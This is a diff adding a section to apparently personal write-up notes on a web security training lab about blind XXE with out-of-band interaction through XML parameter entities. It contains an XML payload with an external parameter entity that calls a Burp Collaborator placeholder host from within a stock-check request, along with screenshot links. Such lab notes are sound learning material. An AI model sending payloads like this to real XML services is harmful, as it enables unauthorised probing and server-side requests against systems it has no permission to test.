@@ -117,3 +117,30 @@ payload:
 <img width="1191" height="612" alt="image" src="https://github.com/user-attachments/assets/f6196373-80b9-48ea-af02-580116aeeb11" />
 
 
+<br><br>
+<hr>
+<br><br>
+<h2>Lab: Blind XXE with out-of-band interaction via XML parameter entities</h2>
+
+payload:
+(ppm>insert collab)
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN">%xxe; ]>
+<stockCheck>
+  <productId>
+6
+  </productId>
+  <storeId>
+2
+  </storeId>
+</stockCheck>
+```
+
+
+<img width="1205" height="636" alt="image" src="https://github.com/user-attachments/assets/afb8f9d5-433e-4cd1-8b61-51be84056d86" />
+
+<img width="1202" height="658" alt="image" src="https://github.com/user-attachments/assets/75506037-121c-460e-8965-71327110cfb5" />
+
+
